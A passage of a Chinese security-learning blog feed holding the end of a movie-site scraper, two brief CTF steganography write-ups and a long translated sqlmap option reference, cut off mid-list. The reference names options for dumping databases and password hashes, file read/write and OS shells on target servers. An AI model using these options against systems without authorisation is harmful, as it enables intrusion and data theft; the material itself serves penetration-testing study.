page_info(info,rules):</span><br><span class="line">            info&#x3D;info.replace(rules,&quot;&quot;).strip()</span><br><span class="line">            return info</span><br><span class="line">        if info.startswith(&quot;◎年　　代&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎年　　代&quot;)</span><br><span class="line">            movie[&#39;year&#39;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎产　　地&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎产　　地&quot;)</span><br><span class="line">            movie[&#39;country&#39;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎类　　别&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎类　　别&quot;)</span><br><span class="line">            movie[&#39;类别&#39;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎豆瓣评分&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎豆瓣评分&quot;)</span><br><span class="line">            movie[&#39;豆瓣评分&#39;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎导　　演&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎导　　演&quot;)</span><br><span class="line">            dirctors&#x3D;[info]</span><br><span class="line">            for x in range(index+1,len(infos)):</span><br><span class="line">                dirctor&#x3D;infos[x].strip()</span><br><span class="line">                if dirctor.startswith(&quot;◎编　　剧&quot;):</span><br><span class="line">                    break</span><br><span class="line">                dirctors.append(dirctor)</span><br><span class="line">            movie[&#39;导演&#39;]&#x3D;dirctors</span><br><span class="line">        elif info.startswith(&quot;◎编　　剧&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎编　　剧&quot;)</span><br><span class="line">            movie[&quot;编剧&quot;]&#x3D;info</span><br><span class="line">        elif info.startswith(&quot;◎主　　演&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎主　　演&quot;)</span><br><span class="line">            actors&#x3D;[info]</span><br><span class="line">            for x in range(index+1,len(infos)):</span><br><span class="line">                actor&#x3D;infos[x].strip()</span><br><span class="line">                if(actor.startswith(&quot;◎标　　签&quot;)):</span><br><span class="line">                    break</span><br><span class="line">                actors.append(actor)</span><br><span class="line">            movie[&#39;actors&#39;]&#x3D;actors</span><br><span class="line">        elif info.startswith(&quot;◎简　　介&quot;):</span><br><span class="line">            info&#x3D;page_info(info,&quot;◎简　　介&quot;)</span><br><span class="line">            for x in range(index+1,len(infos)):</span><br><span class="line">                detail&#x3D;infos[x].strip()</span><br><span class="line">                if(detail.startswith(&quot;◎获奖情况&quot;)):</span><br><span class="line">                    break</span><br><span class="line">                movie[&#39;detail&#39;]&#x3D;detail</span><br><span class="line">    download_url&#x3D;html.xpath(&quot;&#x2F;&#x2F;td[@bgcolor&#x3D;&#39;#fdfddf&#39;]&#x2F;&#x2F;a&#x2F;text()&quot;)</span><br><span class="line">    movie[&#39;download_url&#39;]&#x3D;download_url</span><br><span class="line">    return movie</span><br><span class="line">def spider():</span><br><span class="line">    #爬取前7页</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;www.dytt8.net&#x2F;html&#x2F;gndy&#x2F;dyzz&#x2F;list_23_&#123;&#125;.html&quot;</span><br><span class="line">    movies&#x3D;[]</span><br><span class="line">    for x in range(1,8):</span><br><span class="line">        #第一个循环获取每个页面</span><br><span class="line">        url&#x3D;base_url.format(x)</span><br><span class="line">        detail_urls&#x3D;get_detail_url(url)</span><br><span class="line">        for detail_url in detail_urls:</span><br><span class="line">            #第二个循环获取每个网页电影的详细页</span><br><span class="line">            movie&#x3D;parse_detail_page(detail_url)</span><br><span class="line">            movies.append(movie)</span><br><span class="line">        print(movies)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    spider()</span><br></pre></td></tr></table></figure></p><hr><h5 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h5><p><strong>获取每个网页的电影详细页：</strong><br><img src="/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB/1.png" class title="This is an test image"></p><hr><h5 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h5><p><strong>解析电影详细页：</strong><br><img src="/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB/2.png" class title="This is an test image"><br><img src="/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB/3.png" class title="This is an test image"></p><hr><h5 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h5><p><strong>爬取前七页：</strong><br><img src="/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB/4.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;近段时间一直在学习爬虫，昨天闲来无事做了一个简单的小爬虫来爬取电影天堂热门电影的前7页。本爬虫利用requests库和lxm
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>2.5 [SWPU2019]我有一只马里奥</title>
    <link href="https://da4er.top/2-5-SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5.html"/>
    <id>https://da4er.top/2-5-SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5.html</id>
    <published>2020-02-05T05:13:09.000Z</published>
    <updated>2020-02-07T07:51:48.295Z</updated>
    
    <content type="html"><![CDATA[<p><strong>题目是一个exe文件，binwalk查看到有个压缩包。</strong><br><img src data-echo="2-5-SWPU2019-我有一只马里奥/1.png" alt="2-5-SWPU2019-我有一只马里奥"><br><strong>打开压缩包，发现题目是ntfs数据流隐写，用工具提取。</strong><br><img src data-echo="2-5-SWPU2019-我有一只马里奥/2.png" alt="2-5-SWPU2019-我有一只马里奥"><br><img src data-echo="2-5-SWPU2019-我有一只马里奥/3.png" alt="2-5-SWPU2019-我有一只马里奥"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;题目是一个exe文件，binwalk查看到有个压缩包。&lt;/strong&gt;&lt;br&gt;&lt;img src data-echo=&quot;2-5-SWPU2019-我有一只马里奥/1.png&quot; alt=&quot;2-5-SWPU2019-我有一只马里奥&quot;&gt;&lt;br&gt;&lt;strong&gt;打开
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.5 [SWPU2019]神奇的二维码</title>
    <link href="https://da4er.top/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81.html"/>
    <id>https://da4er.top/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81.html</id>
    <published>2020-02-05T05:01:58.000Z</published>
    <updated>2020-02-07T12:09:31.846Z</updated>
    
    <content type="html"><![CDATA[<p><strong>解压后，出来一张二维码</strong><br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/1.png" class title="This is an test image"><br>利用binwalk查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk BitcoinPay.png</span><br></pre></td></tr></table></figure><br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/2.png" class title="This is an test image"><br>有四个压缩包<br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/3.png" class title="This is an test image"><br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/4.png" class title="This is an test image"><br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/5.png" class title="This is an test image"><br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/6.png" class title="This is an test image"><br><strong>第一个压缩包没用东西，只有一张表情包（可以保存一下哈哈哈哈~）</strong><br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/7.png" class title="This is an test image"><br><strong>第二个压缩包是base64编码</strong><br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/8.png" class title="This is an test image"><br><strong>第三个压缩包是多长base64编码</strong><br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/9.png" class title="This is an test image"><br><strong>第四个压缩包是一个mp3文件，但是打开需要密码，将上面解码的base64都试一下，发现flag.doc里的是压缩包密码。</strong><br><br>将这个转换成摩斯再解码，得到flag。（这里有个小坑解出来的摩斯是大写要转换成小写才是正确的flag）<br><img src="/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/1.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;解压后，出来一张二维码&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/1.png&quot; class title=&quot;This i
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SQLMAP使用手册</title>
    <link href="https://da4er.top/SQLMAP%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C.html"/>
    <id>https://da4er.top/SQLMAP%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C.html</id>
    <published>2019-11-24T03:06:19.000Z</published>
    <updated>2020-02-07T07:52:24.303Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqlmap是sql注入中使用的神器，也是渗透测试人员必须掌握的工具。因为最近在学习sql注入的专题，所以写下笔记来记录学习。<br><img src data-echo="SQLMAP使用手册/1.jpg" alt></p><h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-h, --help 显示基本帮助信息</span><br><span class="line">-hh 显示高级帮助信息</span><br><span class="line">--version 显示程序版本号</span><br><span class="line">-v VERBOSE  赘言级别：0-6(默认 1)</span><br></pre></td></tr></table></figure><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-d DIRECT 直接连接到数据库</span><br><span class="line">-u URL, --url&#x3D;URL 目标URL(e.g. &quot;www.target.com&#x2F;vuln.php?id&#x3D;1&quot;)</span><br><span class="line">-l LOGFILE 从Burp 或 WebScarab 日志中解析目标</span><br><span class="line">-m BULKFILE 在给定的文本文件中读取多个扫描目标</span><br><span class="line">-g GOOGLEDORK  将Google dork 结果作为目标URL</span><br><span class="line">-r REQUESTFILE  从文件中读取HTTP 请求</span><br><span class="line">-c CONFIGFILE 从INI 配置文件中读取配置选项</span><br></pre></td></tr></table></figure><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">--data&#x3D;DATA 通过POST 方法提交的数据字符串</span><br><span class="line">--param-del&#x3D;PDEL 用于分割参数值的字符</span><br><span class="line">--cookie&#x3D;COOKIE HTTP Cookie 头</span><br><span class="line">--cookie-del&#x3D;CDEL 用于分割cookie 值的字符</span><br><span class="line">--load-cookies&#x3D;L.. 包含cookies 的Netscape&#x2F;wget 格式文件</span><br><span class="line">--drop-set-cookie 忽略响应中的Set-Cookie 头</span><br><span class="line">--user-agent&#x3D;AGENT  HTTP User-Agent 头</span><br><span class="line">--random-agent 使用随机选择的HTTP User-Agent 头</span><br><span class="line">--host&#x3D;HOST HTTP Host 头</span><br><span class="line">--referer&#x3D;REFERER HTTP Referer 头</span><br><span class="line">--headers&#x3D;HEADERS Extra 头(e.g. &quot;Accept-Language: fr\nETag: 123&quot;)</span><br><span class="line">--auth-type&#x3D;AUTH.. HTTP 认证方式(Basic, Digest, NTLM 或 PKI)</span><br><span class="line">--auth-cred&#x3D;AUTH.. HTTP 认证证书(name:password)</span><br><span class="line">--auth-private&#x3D;A.. HTTP 认证PEM 私钥文件</span><br><span class="line">--proxy&#x3D;PROXY 使用代理连接目标URL</span><br><span class="line">--proxy-cred&#x3D;PRO.. 代理认证证书(name:password)</span><br><span class="line">--proxy-file&#x3D;PRO.. 从文件读取代理列表</span><br><span class="line">--ignore-proxy 接受系统默认代理设置</span><br><span class="line">--tor 使用Tor 匿名网络</span><br><span class="line">--tor-port&#x3D;TORPORT 设置默认以外的Tor 代理端口</span><br><span class="line">--tor-type&#x3D;TORTYPE 设置 Tor 代理方式(HTTP( 默认), SOCKS4 或SOCKS5)</span><br><span class="line">--check-tor 检查Tor 是否正确使用</span><br><span class="line">--delay&#x3D;DELAY 每个HTTP 请求之间延迟的秒数</span><br><span class="line">--timeout&#x3D;TIMEOUT 认定连接超时的秒数(默认 30)</span><br><span class="line">--retries&#x3D;RETRIES 超时重试的次数(默认 3)</span><br><span class="line">--randomize&#x3D;RPARAM 随机改变给定参数的值</span><br><span class="line">--safe-url&#x3D;SAFURL 设置一个安全链接供系统经常访问</span><br><span class="line">--safe-freq&#x3D;SAFREQ 设置一个安全连接供系统在两次测试之间访问</span><br><span class="line">--skip-urlencode 不对攻击载荷数据进行URL 编码</span><br><span class="line">--force-ssl   强制使用SSL&#x2F;HTTPS</span><br><span class="line">--hpp 使用HTTP 参数污染</span><br><span class="line">--eval&#x3D;EVALCODE 供提交请求之前评估参数的 Python 代码(e.g. &quot;import hashlib;id2&#x3D;hashlib.md5(id).hexdigest()&quot;)</span><br></pre></td></tr></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-o 开启所有优化开关</span><br><span class="line">--predict-output 预测常见的查询输出</span><br><span class="line">--keep-alive 使用持久的HTTP(s)连接</span><br><span class="line">--null-connection 检索HTTP 响应长度不实际的页面</span><br><span class="line">--threads&#x3D;THREADS 并发HTTP(s)请求的最大数量(默认 1)</span><br></pre></td></tr></table></figure><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-p TESTPARAMETER 测试参数</span><br><span class="line">--skip&#x3D;SKIP  跳过对给定参数的测试</span><br><span class="line">--dbms&#x3D;DBMS  在这里强制指定后端DBMS</span><br><span class="line">--dbms-cred&#x3D;DBMS.. DBMS 认证证书(user:password)</span><br><span class="line">--os&#x3D;OS  在这里强制后端DBMS 操作系统</span><br><span class="line">--invalid-bignum 使用大数字无效化值</span><br><span class="line">--invalid-logical 使用逻辑运算无效化值</span><br><span class="line">--invalid-string 使用随机字符串无效化值</span><br><span class="line">--no-cast  关闭攻击载荷铸造机制</span><br><span class="line">--no-escape 关闭字符串逃逸机制</span><br><span class="line">--prefix&#x3D;PREFIX 注入攻击载荷前缀字符串</span><br><span class="line">--suffix&#x3D;SUFFIX 注入攻击载荷后缀字符串</span><br><span class="line">--tamper&#x3D;TAMPER  使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--level&#x3D;LEVEL 执行测试的等级(1-5, 默认 1)</span><br><span class="line">--risk&#x3D;RISK 执行测试的风险(0-3, 默认 1)</span><br><span class="line">--string&#x3D;STRING 查询被评估为True 时的匹配字符串</span><br><span class="line">--not-string&#x3D;NOT.. 查询被评估为False 时的匹配字符串</span><br><span class="line">--regexp&#x3D;REGEXP 查询被评估为True 时的正则表达式</span><br><span class="line">--code&#x3D;CODE 查询被评估为True 时的HTTP 代码</span><br><span class="line">--text-only 仅基于文本内容比较网页</span><br><span class="line">--titles 仅基于标题比较网页</span><br></pre></td></tr></table></figure><h3 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--technique&#x3D;TECH 使用的SQL 注入技术(默认使用所有技术)</span><br><span class="line">--time-sec&#x3D;TIMESEC DBMS 响应的延迟秒数(默认 5)</span><br><span class="line">--union-cols&#x3D;UCOLS UNION 查询注入测试字段的范围</span><br><span class="line">--union-char&#x3D;UCHAR 暴破字段数量使用的字符</span><br><span class="line">--union-from&#x3D;UFROM UNION 查询注入FROM 部分使用的数据表</span><br><span class="line">--dns-domain&#x3D;DNS.. DNS 溢出攻击所使用的域名</span><br><span class="line">--second-order&#x3D;S.. 二阶响应页面URL</span><br></pre></td></tr></table></figure><h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-f, --fingerprint  检查 DBMS 版本指纹</span><br></pre></td></tr></table></figure><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-a, --all 检索一切</span><br><span class="line">-b, --banner 检索DBMS banner 信息</span><br><span class="line">--current-user 检索DBMS 当前用户</span><br><span class="line">--current-db 检索DBMS 当前数据库</span><br><span class="line">--hostname  检索DBMS 服务器主机名</span><br><span class="line">--is-dba 检测当前用户是否是DBA</span><br><span class="line">--users 枚举DBMS 用户名</span><br><span class="line">--passwords  枚举DBMS 用户密码哈希</span><br><span class="line">--privileges 枚举DBMS 用户权限</span><br><span class="line">--roles  枚举DBMS 用户角色</span><br><span class="line">--dbs 枚举DBMS 数据库</span><br><span class="line">--tables 枚举DBMS 数据库表</span><br><span class="line">--columns 枚举DBMS 数据库表字段</span><br><span class="line">--schema 枚举DBMS 架构</span><br><span class="line">--count  检索数据表中的条目数</span><br><span class="line">--dump 转储DBMS 数据库表中的条目</span><br><span class="line">--dump-all 转储所有DBMS 数据库表中的条目</span><br><span class="line">--search 搜索字段名, 表名和(或)库名</span><br><span class="line">--comments 检索DBMS 注释</span><br><span class="line">-D DB DBMS 数据库</span><br><span class="line">-T TBL DBMS 数据库表</span><br><span class="line">-C COL DBMS 数据库表字段</span><br><span class="line">-X EXCLUDECOL 不枚举DBMS 数据库表字段</span><br><span class="line">-U USER DBMS 用户</span><br><span class="line">--exclude-sysdbs 枚举数据库表时排除DBMS 系统库</span><br><span class="line">--where&#x3D;DUMPWHERE 转储数据表时使用WHERE 条件</span><br><span class="line">--start&#x3D;LIMITSTART 第一个查询的输出项检索</span><br><span class="line">--stop&#x3D;LIMITSTOP 最后一个查询的输出项检索</span><br><span class="line">--first&#x3D;FIRSTCHAR 第一个查询的输出字的字符检索</span><br><span class="line">--last&#x3D;LASTCHAR 最后一个查询的输出字的字符检索</span><br><span class="line">--sql-query&#x3D;QUERY 要执行的SQL 语句</span><br><span class="line">--sql-shell  返回交互式的SQL shell</span><br><span class="line">--sql-file&#x3D;SQLFILE 从给定的文件执行SQL 语句</span><br></pre></td></tr></table></figure><h3 id="强制爆破"><a href="#强制爆破" class="headerlink" title="强制爆破"></a>强制爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--common-tables 检查是否存在常见表</span><br><span class="line">--common-columns 检查是否存在常见字段用户定义函数注入：</span><br><span class="line">--udf-inject 注入用户自定义函数</span><br><span class="line">--shared-lib&#x3D;SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure><h3 id="文件系统访问"><a href="#文件系统访问" class="headerlink" title="文件系统访问"></a>文件系统访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--file-read&#x3D;RFILE 从后端DBMS 文件系统读取文件</span><br><span class="line">--file-write&#x3D;WFILE 向后端DBMS 文件系统写入本地文件</span><br><span class="line">--file-dest&#x3D;DFILE 向后端DBMS 文件系统写入文件的绝对路径</span><br></pre></td></tr></table></figure><h3 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd&#x3D;OSCMD  执行操作系统命令</span><br><span class="line">--os-shell    返回交互式的操作系统shell</span><br><span class="line">--os-pwn 返回OOB shell, meterpreter 或VNC</span><br><span class="line">--os-smbrelay 一键返回OOB shell, meterpreter 或VNC</span><br><span class="line">--os-bof 存储过程缓冲区溢出利用</span><br><span class="line">--priv-esc 数据库进程用户权限提升</span><br><span class="line">--msf-path&#x3D;MSFPATH 已安装的Metasploit Framework 本地路径</span><br><span class="line">--tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure><h3 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--reg-read 读取一个Windows 注册表键值</span><br><span class="line">--reg-add 写入一个Windows 注册表键值</span><br><span class="line">--reg-del 删除一个Windows 注册表键值</span><br><span class="line">--reg-key&#x3D;REGKEY Windows 注册表键</span><br><span class="line">--reg-value&#x3D;REGVAL Windows 注册表键值</span><br><span class="line">--reg-data&#x3D;REGDATA Windows 注册表键值数据</span><br><span class="line">--reg-type&#x3D;REGTYPE Windows 注册表键值类型</span><br></pre></td></tr></table></figure><h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">-s SESSIONFILE  从存储(.sqlite)文件中读取会话</span><br><span class="line"></span><br><span class="line">-t TRAFFICFILE 记录所有HTTP 流量为一个文本文件</span><br><span class="line"></span><br><span class="line">--batch                 从不询问用户输入,  使用默认行为</span><br><span class="line"></span><br><span class="line">--charset&#x3D;CHARSET 强制数据检索使用的字符编码</span><br><span class="line"></span><br><span class="line">--crawl&#x3D;CRAWLDEPTH  从目标URL 抓取起始网页</span><br><span class="line"></span><br><span class="line">--csv-del&#x3D;CSVDEL CSV 输出中使用的定界符(默认&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">--dump-format&#x3D;DU.. 转储数据的格式(CSV(默认), 可以设置为HTML</span><br><span class="line"></span><br><span class="line">或SQLITE)</span><br><span class="line"></span><br><span class="line">--eta 显示每个输出的预计到达时间</span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line">--forms   分析并测试目标URL 中的表单</span><br><span class="line">--fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line">--hex 对数据检索使用DBMS 的hex 函数</span><br><span class="line">--output-dir&#x3D;OUT.. 自定义输出目录路径</span><br><span class="line">--parse-errors 从响应中分析并显示DBMS 错误消息</span><br><span class="line">--pivot-column&#x3D;P.. 透视字段</span><br><span class="line">--save 保存选项到INI 配置文件</span><br><span class="line">--scope&#x3D;SCOPE 用正则表达式从所提供的代理日志过滤目标</span><br><span class="line">--test-filter&#x3D;TE.. 通过攻击载荷和(或)标题选择测试(e.g. ROW)</span><br><span class="line">--update 更新sqlmap</span><br></pre></td></tr></table></figure><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-z MNEMONICS 使用短记忆法(e.g. &quot;flu,bat,ban,tec&#x3D;EU&quot;)</span><br><span class="line">--alert&#x3D;ALERT 当找到 SQL 注入时运行操作系统命令</span><br><span class="line">--answers&#x3D;ANSWERS 设置问题的答案(e.g. &quot;quit&#x3D;N,follow&#x3D;N&quot;)</span><br><span class="line">--beep 当找到SQL 注入时发出蜂鸣</span><br><span class="line">--check-waf 启发式检查 WAF&#x2F;IPS&#x2F;IDS 保护</span><br><span class="line">--cleanup 从sqlmap 具体UDF 和表清理DBMS</span><br><span class="line">--dependencies 检查是否缺少(非核心)的sqlmap 的依赖</span><br><span class="line">--disable-coloring 禁用控制台输出着色</span><br><span class="line">--gpage&#x3D;GOOGLEPAGE 从指定页码使用Google dork 结果</span><br><span class="line">--identify-waf 使测试通过 WAF&#x2F;IPS&#x2F;IDS 保护</span><br><span class="line">--mobile 通过HTTP User-Agent 头模拟智能手机</span><br><span class="line">--page-rank 为Google dork 